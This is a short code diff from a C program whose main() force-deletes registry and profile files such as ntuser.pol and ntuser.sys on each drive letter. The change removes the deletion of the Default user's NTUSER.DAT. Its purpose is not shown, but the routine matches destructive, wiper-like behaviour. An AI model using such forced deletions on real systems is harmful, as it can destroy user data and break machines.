@@ -284,9 +284,6 @@ int main() {
 			wsprintf(path, L"%c:\\ProgramData\\ntuser.pol", drive);
 			ForceDeleteFile(path);
 
-			wsprintf(path, L"%c:\\Users\\Default\\NTUSER.DAT", drive);
-			ForceDeleteFile(path);
-
 			wsprintf(path, L"%c:\\Recovery\\ntuser.sys", drive);
 			ForceDeleteFile(path);
 
